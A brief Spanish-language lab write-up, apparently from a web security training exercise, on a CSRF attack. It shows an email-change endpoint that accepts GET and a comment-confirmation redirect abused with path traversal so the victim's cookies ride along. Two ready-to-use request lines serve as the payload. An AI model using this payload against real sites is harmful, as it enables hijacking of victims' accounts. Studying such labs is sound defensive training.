Aca lo que pasa es que primero nos permite cambiar el mail pero en vez de usar el metodo POST nos permite usar GET por lo que le pasamos los parametros por la url

`GET /my-account/change-email?email=hack%40gmail.com&submit=1 HTTP/2`

Ademas lo que pasa es que en la sección de comentarios al crear uno, nos redirige al mismo comentario por lo que usamos esa redireccion para que se haga la petición de arriba pero como es una dirección desde la misma web se arrastran las cookies por lo que a la hora de que la victima entre a la url se le cambiara el mail

`GET /post/comment/confirmation?postId=../my-account/change-email%3femail=hack%40hack.com%26submit%3d1 HTTP/2`